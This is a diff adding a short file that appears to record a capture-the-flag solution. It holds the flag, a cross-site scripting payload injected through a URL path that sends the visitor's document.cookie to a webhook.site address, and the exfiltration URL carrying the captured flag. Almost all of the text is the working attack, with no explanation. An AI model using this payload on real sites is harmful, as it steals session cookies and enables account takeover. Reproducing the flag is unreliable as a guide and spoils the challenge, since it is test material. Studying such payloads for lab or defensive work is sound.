@@ -1,0 +1,5 @@
+DH{5b3d3705d88555128cdc3a322a5ae5b2}
+
+index.php/;location='https://webhook.site/4cbc695a-de6a-44e3-8d75-583b7d7240a2/'+document.cookie;//static/?page=vuln&param=test
+
+https://webhook.site/4cbc695a-de6a-44e3-8d75-583b7d7240a2/flag=DH%7B5b3d3705d88555128cdc3a322a5ae5b2%7D
